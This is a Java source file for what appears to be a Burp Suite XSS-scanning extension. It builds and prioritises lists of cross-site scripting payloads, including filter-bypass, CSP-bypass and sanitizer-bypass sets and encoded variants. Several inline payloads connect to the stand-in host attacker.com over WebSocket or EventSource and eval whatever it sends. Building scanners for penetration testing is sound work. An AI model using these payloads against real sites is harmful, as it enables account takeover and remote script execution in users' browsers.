package burp;

import java.util.*;
import static burp.Constants.*;

/**
 * ADVANCED: Streamlined PayloadManager with Application-Type and Content-Specific Payloads
 * This makes the extension unique by adapting payloads to application architecture and content type
 */
public class PayloadManager {
    private final Settings settings;
    private final IBurpExtenderCallbacks callbacks;
    private final ApplicationTypeSpecificPayloadGenerator appTypeGenerator;
    private final ContentSpecificPayloadGenerator contentTypeGenerator;
    
    public PayloadManager(Settings settings, IBurpExtenderCallbacks callbacks) {
        this.settings = settings;
        this.callbacks = callbacks;
        this.appTypeGenerator = new ApplicationTypeSpecificPayloadGenerator(callbacks, settings);
        this.contentTypeGenerator = new ContentSpecificPayloadGenerator(callbacks, settings);
    }
    
    /**
     * STREAMLINED: Get advanced payloads with application-type and content-specific intelligence
     * This is the core method that makes the extension effective
     * CRITICAL: Simple payloads are tried FIRST for better detection
     * ADVANCED: Payloads are prioritized by success rate and context
     */
    public List<String> getAdvancedPayloads(Map parameter) {
        List<String> payloads = new ArrayList<>();
        
        // Step 1: CRITICAL - Always try SIMPLE payloads FIRST for better detection
        // These are the most effective and least likely to be filtered
        String[] simplePayloads = {
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<body onload=alert(1)>"
        };
        payloads.addAll(Arrays.asList(simplePayloads));
        
        // Step 2: Add core payloads (these are also relatively simple)
        payloads.addAll(Arrays.asList(CORE_XSS_PAYLOADS));
        
        // Step 3: Add advanced payloads (more complex, tried after simple ones)
        payloads.addAll(Arrays.asList(ADVANCED_XSS_PAYLOADS));
        
        // Get application type and content type from parameter
        String applicationType = (String) parameter.get("APPLICATION_TYPE");
        String contentType = (String) parameter.get("CONTENT_TYPE");
        String reflectionContext = (String) parameter.get("REFLECTION_CONTEXT");
        ModernArchitectureDetector.ArchitectureAnalysis archAnalysis = 
            (ModernArchitectureDetector.ArchitectureAnalysis) parameter.get("ARCH_ANALYSIS");
        
        // Step 3: Add application-type specific payloads (STREAMLINED)
        if (archAnalysis != null || applicationType != null) {
            // CRITICAL: Get response body for application-specific payload generation
            String responseBody = null;
            try {
                // First try to get from parameter (set in getContextAwarePayloads)
                Object responseBodyObj = parameter.get("RESPONSE_BODY");
                if (responseBodyObj instanceof String) {
                    responseBody = (String) responseBodyObj;
                } else {
                    // Fallback: try to get from parameter
                    Object requestResponseObj = parameter.get("REQUEST_RESPONSE");
                    if (requestResponseObj instanceof IHttpRequestResponse) {
                        IHttpRequestResponse reqResp = (IHttpRequestResponse) requestResponseObj;
                        byte[] response = reqResp.getResponse();
                        if (response != null && response.length > 0) {
                            // Note: We don't have helpers here, so we'll just use the full response
                            // This is a fallback and may not be perfect, but it's better than nothing
                            responseBody = new String(response, java.nio.charset.StandardCharsets.UTF_8);
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore - response body not critical
            }
            
            List<String> appTypePayloads = appTypeGenerator.generatePayloadsForApplicationType(
                applicationType, contentType, archAnalysis, responseBody);
            payloads.addAll(appTypePayloads);
        }
        
        // Step 4: Add content-type specific payloads (STREAMLINED)
        if (contentType != null || reflectionContext != null) {
            List<String> contentTypePayloads = contentTypeGenerator.generatePayloadsForContentType(
                contentType, reflectionContext);
            payloads.addAll(contentTypePayloads);
        }
        
        // Step 5: Add UI-enabled advanced payloads
        if (settings.getEnableJSFucker()) {
            payloads.addAll(Arrays.asList(JSFUCKER_XSS_PAYLOADS));
        }
        
        if (settings.getEnableWAFBypass()) {
            payloads.addAll(Arrays.asList(WAF_BYPASS_PAYLOADS));
        }
        
        if (settings.getEnableBrowserSpecific()) {
            payloads.addAll(Arrays.asList(BROWSER_SPECIFIC_PAYLOADS));
        }
        
        if (settings.getEnableFrameworkSpecific()) {
            payloads.addAll(Arrays.asList(FRAMEWORK_SPECIFIC_PAYLOADS));
        }
        
        // CUTTING-EDGE PAYLOADS - COMPREHENSIVE COVERAGE
        if (settings.getEnablePrototypePollution()) {
            payloads.addAll(Arrays.asList(PROTOTYPE_POLLUTION_XSS));
        }
        
        if (settings.getEnablePostMessageXSS()) {
            payloads.addAll(Arrays.asList(POSTMESSAGE_XSS));
        }
        
        if (settings.getEnableWebComponents()) {
            payloads.addAll(Arrays.asList(WEB_COMPONENTS_XSS));
        }
        
        if (settings.getEnableShadowDOM()) {
            payloads.addAll(Arrays.asList(SHADOW_DOM_XSS));
        }
        
        if (settings.getEnableWebAssembly()) {
            payloads.addAll(Arrays.asList(WEBASSEMBLY_XSS));
        }

        if (settings.getEnableCSPBypass()) {
            payloads.addAll(Arrays.asList(CSP_BYPASS_PAYLOADS));
        }

        if (settings.getEnableModernBrowserAPI()) {
            payloads.addAll(Arrays.asList(MODERN_BROWSER_API_XSS));
            // Advanced modern browser API bypasses
            payloads.addAll(Arrays.asList(TRUSTED_TYPES_BYPASS_PAYLOADS));
            payloads.addAll(Arrays.asList(SANITIZER_API_BYPASS_PAYLOADS));
            payloads.addAll(Arrays.asList(DOMPURIFY_BYPASS_PAYLOADS));
            payloads.addAll(Arrays.asList(BLOB_FILE_API_XSS_PAYLOADS));
            payloads.addAll(Arrays.asList(IMPORT_MAPS_XSS_PAYLOADS));
            payloads.addAll(Arrays.asList(MODULE_WORKERS_XSS_PAYLOADS));
        }
        
        // ADDITIONAL COMPREHENSIVE ATTACK VECTORS - Gated by settings for advanced mode
        // These are advanced techniques that should only be used when explicitly enabled
        if (settings.getEnablePolyglotPayloads()) {
            payloads.addAll(Arrays.asList(POLYGLOT_XSS_PAYLOADS));
        }
        
        // Advanced SVG and CSS injection (always include for comprehensive coverage)
        payloads.addAll(Arrays.asList(ADVANCED_SVG_XSS_PAYLOADS));
        payloads.addAll(Arrays.asList(ADVANCED_CSS_INJECTION_PAYLOADS));
        
        // Markdown and MathML XSS (for content management systems)
        if (settings.getEnableFrameworkSpecific()) {
            payloads.addAll(Arrays.asList(MARKDOWN_XSS_PAYLOADS));
            payloads.addAll(Arrays.asList(MATHML_XSS_PAYLOADS));
        }
        
        // Advanced attack vectors - only in aggressive/expert mode
        boolean aggressiveMode = settings.getAggressiveMode() != null && settings.getAggressiveMode();
        String scannerMode = settings.getScannerMode();
        boolean expertMode = scannerMode != null && scannerMode.contains("Expert");
        
        if (aggressiveMode || expertMode) {
            payloads.addAll(Arrays.asList(MUTATION_XSS_PAYLOADS));
            payloads.addAll(Arrays.asList(UNIVERSAL_XSS_PAYLOADS));
            payloads.addAll(Arrays.asList(SOP_BYPASS_PAYLOADS));
            payloads.addAll(Arrays.asList(CORS_BYPASS_PAYLOADS));
            payloads.addAll(Arrays.asList(IFRAME_SANDBOX_BYPASS));
            // SameSite cookie bypass, header injection, cookie injection (advanced techniques)
            payloads.addAll(Arrays.asList(SAMESITE_COOKIE_BYPASS_PAYLOADS));
            payloads.addAll(Arrays.asList(HEADER_INJECTION_XSS_PAYLOADS));
            payloads.addAll(Arrays.asList(COOKIE_INJECTION_XSS_PAYLOADS));
        }
        
        // CRITICAL: Add real-time dynamic payloads if real-time vectors detected
        try {
            Object realtimeVectorsObj = parameter.get("REALTIME_VECTORS");
            Object realtimeClientVectorsObj = parameter.get("REALTIME_CLIENT_VECTORS");
            
            if (realtimeVectorsObj instanceof List) {
                List<String> realtimeVectors = (List<String>) realtimeVectorsObj;
                if (realtimeVectors.contains("MutationObserver") || Boolean.TRUE.equals(parameter.get("HAS_MUTATION_OBSERVER"))) {
                    payloads.add("<script>new MutationObserver(()=>alert('REALTIME_MUTATION')).observe(document,{childList:true,subtree:true})</script>");
                    payloads.add("<script>new MutationObserver(mutations=>eval('alert(\"REALTIME_MUTATION\")')).observe(document.body,{attributes:true})</script>");
                }
                if (realtimeVectors.contains("WebSocket") || Boolean.TRUE.equals(parameter.get("HAS_WEBSOCKET"))) {
                    payloads.add("<script>const ws=new WebSocket('ws://attacker.com');ws.onmessage=e=>eval(e.data);ws.send('alert(\"REALTIME_WS\")')</script>");
                }
                if (realtimeVectors.contains("EventSource") || Boolean.TRUE.equals(parameter.get("HAS_EVENT_SOURCE"))) {
                    payloads.add("<script>const evtSource=new EventSource('https://attacker.com/events');evtSource.onmessage=e=>eval(e.data)</script>");
                }
                if (realtimeVectors.contains("ServiceWorker") || Boolean.TRUE.equals(parameter.get("HAS_SERVICE_WORKER"))) {
                    payloads.add("<script>navigator.serviceWorker.register('data:application/javascript,self.onmessage=e=>eval(e.data)').then(sw=>sw.active.postMessage('alert(\"REALTIME_SW\")'))</script>");
                }
                if (realtimeVectors.contains("Dynamic Import") || Boolean.TRUE.equals(parameter.get("HAS_DYNAMIC_IMPORT"))) {
                    payloads.add("<script>import('data:text/javascript,alert(\"REALTIME_DI\")')</script>");
                }
                if (realtimeVectors.contains("WebAssembly") || Boolean.TRUE.equals(parameter.get("HAS_WEBASSEMBLY"))) {
                    payloads.add("<script>WebAssembly.instantiate(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00])).then(()=>alert('REALTIME_WASM'))</script>");
                }
            }
            
            if (realtimeClientVectorsObj instanceof List) {
                List<String> clientVectors = (List<String>) realtimeClientVectorsObj;
                if (clientVectors.contains("LiveDOMMonitoring") || Boolean.TRUE.equals(parameter.get("HAS_LIVE_DOM_MONITORING"))) {
                    payloads.add("<script>new MutationObserver(()=>alert('REALTIME_DOM')).observe(document,{childList:true,subtree:true})</script>");
                }
                if (clientVectors.contains("RealTimeCommunication") || Boolean.TRUE.equals(parameter.get("HAS_REALTIME_COMMUNICATION"))) {
                    payloads.add("<script>const ws=new WebSocket('ws://attacker.com');ws.onmessage=e=>eval(e.data)</script>");
                }
                if (clientVectors.contains("DynamicCodeExecution") || Boolean.TRUE.equals(parameter.get("HAS_DYNAMIC_CODE_EXECUTION"))) {
                    payloads.add("<script>import('data:text/javascript,alert(\"REALTIME_DCE\")')</script>");
                }
            }
        } catch (Exception e) {
            // Ignore real-time payload addition errors
        }
        
        // Remove duplicates while preserving order
        Set<String> uniquePayloads = new LinkedHashSet<>(payloads);
        payloads = new ArrayList<>(uniquePayloads);
        
        // ADVANCED: Final prioritization based on success rates
        PayloadSuccessTracker payloadTracker = EnhancedAggressive.getPayloadTracker();
        if (payloadTracker != null) {
            // Prioritize based on application type and context
            if (applicationType != null && reflectionContext != null) {
                payloads = payloadTracker.prioritizePayloadsForContext(
                    payloadTracker.prioritizePayloadsForAppType(payloads, applicationType),
                    reflectionContext
                );
            } else if (applicationType != null) {
                payloads = payloadTracker.prioritizePayloadsForAppType(payloads, applicationType);
            } else if (reflectionContext != null) {
                payloads = payloadTracker.prioritizePayloadsForContext(payloads, reflectionContext);
            } else {
                payloads = payloadTracker.prioritizePayloads(payloads);
            }
            
            // Add recently successful payloads to the front
            List<String> recentSuccesses = payloadTracker.getRecentSuccesses();
            for (int i = recentSuccesses.size() - 1; i >= 0; i--) {
                String recent = recentSuccesses.get(i);
                if (!payloads.contains(recent)) {
                    payloads.add(0, recent); // Add to front
                } else {
                    // Move to front if already in list
                    payloads.remove(recent);
                    payloads.add(0, recent);
                }
            }
        }
        
        callbacks.printOutput("[PayloadManager] Selected " + payloads.size() + " payloads for parameter: " + parameter.get(NAME) + 
                            " (AppType: " + applicationType + ", ContentType: " + contentType + ")");
        
        return payloads;
    }
    
    /**
     * ADVANCED: Order payloads by reflection context for better detection
     * If payload reflected in <script> tag → prioritize JS payloads
     * If reflected in HTML attribute → prioritize event handler payloads
     * If reflected in JSON → prioritize JSON-specific payloads
     */
    private List<String> orderPayloadsByContext(List<String> payloads, String context) {
        if (context == null || context.equals("UNKNOWN")) {
            return payloads; // No reordering if context unknown
        }
        
        List<String> contextRelevant = new ArrayList<>();
        List<String> contextIrrelevant = new ArrayList<>();
        
        String contextLower = context.toLowerCase();
        
        for (String payload : payloads) {
            String payloadLower = payload.toLowerCase();
            boolean isRelevant = false;
            
            // JavaScript context - prioritize JS payloads
            if (contextLower.contains("javascript") || contextLower.contains("script")) {
                if (payloadLower.contains("script") || payloadLower.contains("eval") || 
                    payloadLower.contains("function") || payloadLower.contains("alert")) {
                    isRelevant = true;
                }
            }
            
            // HTML attribute context - prioritize event handlers
            if (contextLower.contains("attribute") || contextLower.contains("on")) {
                if (payloadLower.contains("onerror") || payloadLower.contains("onload") || 
                    payloadLower.contains("onclick") || payloadLower.contains("onmouseover")) {
                    isRelevant = true;
                }
            }
            
            // JSON context - prioritize JSON-specific payloads
            if (contextLower.contains("json")) {
                if (payloadLower.contains("json") || payloadLower.contains("\\u") || 
                    payloadLower.contains("\\x") || payloadLower.contains("string.fromcharcode")) {
                    isRelevant = true;
                }
            }
            
            // HTML context - prioritize HTML tags
            if (contextLower.contains("html") || contextLower.contains("body")) {
                if (payloadLower.contains("<script") || payloadLower.contains("<img") || 
                    payloadLower.contains("<svg") || payloadLower.contains("<iframe")) {
                    isRelevant = true;
                }
            }
            
            if (isRelevant) {
                contextRelevant.add(payload);
            } else {
                contextIrrelevant.add(payload);
            }
        }
        
        // Return relevant payloads first, then others
        List<String> ordered = new ArrayList<>();
        ordered.addAll(contextRelevant);
        ordered.addAll(contextIrrelevant);
        return ordered;
    }
    
    /**
     * STREAMLINED: Get context-aware payloads with full intelligence
     * This method is called with IExtensionHelpers to properly analyze responses
     */
    public List<String> getContextAwarePayloads(Map parameter, IHttpRequestResponse requestResponse) {
        return getContextAwarePayloads(parameter, requestResponse, null);
    }
    
    /**
     * STREAMLINED: Get context-aware payloads with helpers injection
     */
    public List<String> getContextAwarePayloads(Map parameter, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        // Enhance parameter with architecture analysis if available
        try {
            ModernArchitectureDetector.ArchitectureAnalysis archAnalysis = 
                (ModernArchitectureDetector.ArchitectureAnalysis) parameter.get("ARCH_ANALYSIS");
            
            // Get content type from response if not set
            if (parameter.get("CONTENT_TYPE") == null && requestResponse != null && helpers != null) {
                try {
                    byte[] response = requestResponse.getResponse();
                    if (response != null && response.length > 0) {
                        IResponseInfo responseInfo = helpers.analyzeResponse(response);
                        List<String> headers = responseInfo.getHeaders();
                        for (String header : headers) {
                            if (header.toLowerCase().startsWith("content-type:")) {
                                String contentType = header.substring(13).trim().split(";")[0].trim();
                                parameter.put("CONTENT_TYPE", contentType);
                                break;
                            }
                        }
                    }
                } catch (Exception e) {
                    // Ignore
                }
            }
            
            // Set application type based on analysis if available
            if (archAnalysis != null) {
                List<String> frameworks = archAnalysis.getDetectedFrameworks();
                if (frameworks.contains("react")) {
                    parameter.put("APPLICATION_TYPE", "REACT");
                } else if (frameworks.contains("angular")) {
                    parameter.put("APPLICATION_TYPE", "ANGULAR");
                } else if (frameworks.contains("vue")) {
                    parameter.put("APPLICATION_TYPE", "VUE");
                } else if (archAnalysis.hasGraphQL()) {
                    parameter.put("APPLICATION_TYPE", "GRAPHQL");
                } else if (archAnalysis.isSPA()) {
                    parameter.put("APPLICATION_TYPE", "SPA");
                } else if (archAnalysis.isMicroservices()) {
                    parameter.put("APPLICATION_TYPE", "MICROSERVICES");
                } else if (archAnalysis.isJAMStack()) {
                    parameter.put("APPLICATION_TYPE", "JAMSTACK");
                }
            }
        } catch (Exception e) {
            callbacks.printError("Error in context-aware payload generation: " + e.getMessage());
        }
        
        List<String> base = getAdvancedPayloads(parameter);

        // CRITICAL: Expand payloads with encoding variants when encoding bypass is enabled
        // This ensures encoded payloads are tested even when caps are in place
        if (helpers != null && settings != null && Boolean.TRUE.equals(settings.getEnableEncodingBypass())) {
            try {
                boolean isJson = false;
                Object ctObj = parameter.get("CONTENT_TYPE");
                if (ctObj != null) {
                    String ct = String.valueOf(ctObj).toLowerCase();
                    isJson = ct.contains("application/json") || ct.contains("+json");
                }

                // Check if aggressive mode or advanced features are enabled - expand more payloads
                boolean aggressiveMode = Boolean.TRUE.equals(settings.getAggressiveMode());
                String scannerMode = settings.getScannerMode();
                boolean expertMode = scannerMode != null && scannerMode.contains("Expert");
                boolean hasAdvancedFeatures = Boolean.TRUE.equals(settings.getEnablePolyglotPayloads()) ||
                                             Boolean.TRUE.equals(settings.getEnableFrameworkSpecific());
                
                List<String> expanded = new ArrayList<>();
                // Expand more seed payloads in aggressive/expert mode or when advanced features enabled
                int seedCount = (aggressiveMode || expertMode || hasAdvancedFeatures)
                    ? Math.min(base.size(), 50)  // Expand more in advanced modes
                    : Math.min(base.size(), 25);  // Default expansion
                    
                for (int i = 0; i < seedCount; i++) {
                    String p = base.get(i);
                    if (p == null || p.trim().isEmpty()) continue;
                    expanded.add(p);
                    expanded.addAll(generateEncodingVariants(p, helpers, isJson));
                }
                // Add remaining base payloads
                for (int i = seedCount; i < base.size(); i++) {
                    expanded.add(base.get(i));
                }

                // Dedupe while preserving order.
                base = new ArrayList<>(new LinkedHashSet<>(expanded));
            } catch (Exception e) {
                // Fail open: return base payload list
            }
        }

        return base;
    }

    private List<String> generateEncodingVariants(String payload, IExtensionHelpers helpers, boolean jsonFriendly) {
        List<String> out = new ArrayList<>();
        if (payload == null || payload.isEmpty() || helpers == null) return out;

        // URL encoding (single + double) — useful for bypassing naive filters and testing decode/normalize behavior.
        try {
            String url1 = helpers.urlEncode(payload);
            if (url1 != null && !url1.equals(payload)) out.add(url1);
            String url2 = helpers.urlEncode(url1);
            if (url2 != null && !url2.equals(url1) && !url2.equals(payload)) out.add(url2);
        } catch (Exception ignored) {}

        // HTML entity encoding (common server-side encoding behavior).
        String html = payload
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;");
        if (!html.equals(payload)) out.add(html);

        // Numeric entity encoding for angle brackets/quotes (often bypasses simplistic allow/deny lists).
        String numeric = payload
            .replace("&", "&#38;")
            .replace("<", "&#60;")
            .replace(">", "&#62;")
            .replace("\"", "&#34;")
            .replace("'", "&#39;");
        if (!numeric.equals(payload) && !numeric.equals(html)) out.add(numeric);

        // JSON/unicode-safe variant (common in SPA/JSON apps when values are serialized).
        if (jsonFriendly) {
            String uni = payload
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("<", "\\u003c")
                .replace(">", "\\u003e")
                .replace("&", "\\u0026");
            if (!uni.equals(payload)) out.add(uni);
        }

        // Hard cap: keep it small and high-signal.
        if (out.size() > 6) out = out.subList(0, 6);
        return out;
    }
    
    /**
     * Get payload category for reporting
     */
    public String getPayloadCategory(String payload) {
        if (Arrays.asList(JSFUCKER_XSS_PAYLOADS).contains(payload)) return "JSFUCKER";
        if (Arrays.asList(WAF_BYPASS_PAYLOADS).contains(payload)) return "WAF_BYPASS";
        if (Arrays.asList(BROWSER_SPECIFIC_PAYLOADS).contains(payload)) return "BROWSER_SPECIFIC";
        if (Arrays.asList(FRAMEWORK_SPECIFIC_PAYLOADS).contains(payload)) return "FRAMEWORK_SPECIFIC";
        if (Arrays.asList(PROTOTYPE_POLLUTION_XSS).contains(payload)) return "PROTOTYPE_POLLUTION";
        if (Arrays.asList(WEB_COMPONENTS_XSS).contains(payload)) return "WEB_COMPONENTS";
        if (Arrays.asList(WEBASSEMBLY_XSS).contains(payload)) return "WEBASSEMBLY";
        return "BASIC";
    }
} 